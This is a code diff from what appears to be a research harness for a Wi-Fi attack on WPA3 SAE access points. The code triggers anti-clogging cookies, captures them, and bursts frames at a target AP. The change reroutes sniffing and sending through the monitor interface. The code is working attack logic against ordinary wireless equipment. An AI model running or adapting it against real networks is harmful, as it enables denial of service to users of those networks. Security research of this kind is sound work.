@@ -58,14 +58,15 @@ void capture_cookies(const string &sniff_iface, const HWAddress<6> &ap_mac, Cook
 	log(LogLevel::INFO, "Cookie capture stopped");
 }
 
-pair<ACMCookie, int> trigger_acm(const string &iface, const string &att_mac, const HWAddress<6> &ap_mac,
-	const int acm_pause_millisec, const int trigger_count, const sae_helper::SAEPair &sae_params) {
+pair<ACMCookie, int> trigger_acm(const string &iface, const string &sniff_iface, const string &att_mac,
+	const HWAddress<6> &ap_mac, const int acm_pause_millisec, const int trigger_count,
+	const sae_helper::SAEPair &sae_params) {
 	PacketSender sender(iface);
 
 	SnifferConfiguration cfg;
 	cfg.set_immediate_mode(true);
 	cfg.set_filter("wlan type mgt subtype auth");
-	Sniffer sniffer(iface, cfg);
+	Sniffer sniffer(sniff_iface, cfg);
 
 	log(LogLevel::INFO, "Triggering ACM (max {} frames)...", trigger_count);
 
@@ -132,9 +133,6 @@ void run_attack(RunStatus &rs) {
 	const size_t frames_per_sec = att_cfg.at("frames_per_second_limit").get<size_t>();
 	const int cookie_wait_ms = att_cfg.at("cookie_wait_ms").get<int>();
 
-	att->set_monitor_mode();
-	att->set_iface_up();
-
 	//TODO chcek if ap has ssid (was hardcoded before)
 	const optional<sae_helper::SAEPair> sae_params = cookie_guzzler::get_commit_values(
 		rs, att.get(SK::iface), att.get_mon_iface(), ap.get(SK::ssid), ap.get(SK::mac), 30);
@@ -143,8 +141,13 @@ void run_attack(RunStatus &rs) {
 	rs.start_observers();
 	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
 	rs.process_manager.write_log_all(ATTACK_START_tag);
-	trigger_acm(
-		att.get(SK::iface), att.get(SK::mac), ap.get(SK::mac), acm_pause_millisec, trigger_count, sae_params.value());
+	trigger_acm(att.get_mon_iface(),
+		att.get_mon_iface(),
+		att.get(SK::mac),
+		ap.get(SK::mac),
+		acm_pause_millisec,
+		trigger_count,
+		sae_params.value());
 	rs.process_manager.write_log_all("@AKM_trigger");
 
 	CookieStore store;
@@ -158,7 +161,7 @@ void run_attack(RunStatus &rs) {
 	});
 
 	try {
-		burst_with_cookies(att.get(SK::iface),
+		burst_with_cookies(att.get_mon_iface(),
 			att.get(SK::mac),
 			ap.get(SK::mac),
 			store,
